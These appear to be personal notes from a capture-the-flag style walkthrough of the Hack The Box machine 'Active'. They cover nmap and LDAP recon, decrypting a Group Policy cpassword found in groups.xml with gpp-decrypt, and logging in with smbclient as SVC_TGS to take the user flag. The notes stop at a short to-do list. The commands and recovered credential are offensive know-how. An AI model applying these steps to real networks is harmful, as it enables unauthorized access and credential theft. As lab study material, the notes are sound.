## Recon

**IP Address: 10.129.37.28**

```bash
sudo nmap -T4 -O -sV -sC -p- -oA active 10.129.37.28
```

###   Findings:

![[activeNmapScan.png]]

### DNS

Domain Name: active.htb

![[dnsRecord.png]]

### RPC

![[rpcClientNOAccess.png]]

### SMB

SMB Map Returned a share that I have read only access to without a user account

![[smbMapOutput.png]]

### LDAP

```bash
ldapsearch -b "" -s base'(objectClass=*)' -x -H ldap://10.129.37.28
```

![[ldapSearchOut.png]]

![[ldapSearchOut2.png]]

After getting the user SMB share I found a groups.xml file that held a username to a service account as well as a possible password for that account

![[groupsXMLFile.png]]

#cpassword is a Group Policy password that uses very weak and crackable encryption

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Password decrypted to 
    GPPstillStandingStrong2k18

Using the credentials found, I was able to authenticate to the system and scan the smb shares further

![[credentialedSMBMap.png]]

I was then able to pull the user flag from the system using smbclient from the user share 

```bash
smbclient -U "active.htb/SVC_TGS" //10.129.37.28/Users
```

Flag was in Users\SVC_TGS\Desktop\user.txt

## With User

Now that I have a user account I was able to log in using rpc and get more information on the systm

![[usersAndGroups.png]]

Go through the new shares
Test kerberos
Test LDAP
Test RPC
